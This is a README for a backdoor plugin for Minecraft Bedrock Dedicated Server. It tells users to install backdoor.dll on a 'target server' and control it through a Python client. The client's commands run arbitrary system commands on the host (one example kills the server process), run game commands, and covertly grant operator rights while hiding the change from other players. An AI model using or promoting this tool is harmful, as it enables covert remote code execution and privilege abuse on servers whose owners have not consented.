# backdoor

A backdoor plugin for Bedrock Dedicated Server

## Usage
1. install ``backdoor.dll`` to the target server
2. Use the backdoor client ``client.py`` for remote control after the target server is opened.

## Run the backdoor client
After installing Python, run the program from the command line with the following command:

```
python client.py
```

Enter the server IP and port
When you start the program, you will be prompted to enter the IP address and port number of the server in the format IP address port number (e.g. 127.0.0.1 19132)

Example:

```
Please input server ip:port like 127.0.0.1 19132
114.51.41.91 9810
```

Client Functions
The client program has the following functions:

``scmd [cmd]`` - executes system commands
``gcmd [cmd]`` - executes game commands
``perm [player name: case sensitive] [level: 0~3] [0: client hide change | 1: client show change]`` - set player permission level
``q`` - Quit the program

Please enter the appropriate command to perform the appropriate action as needed. For example, to execute the game command ``kick WillowSauceR``, enter the following command:

```
>>> gcmd kick WillowSauceR
```

Execute the system command ``taskkill /F /IM bedrock_server.exe``
```
>>> scmd taskkill /F /IM bedrock_server.exe
```

Set permissions for players in the game
Permission level: 0 for normal players, greater than 0 for OP
Show/hide: hide permission changes from other players and yourself, not discoverable within the game
The following command sets OP permissions for player ``WillowSauceR`` and hides it from other players
```
>>> perm WillowSauceR 1 0
```

To exit the program, enter the following command:

```
>>> q
```
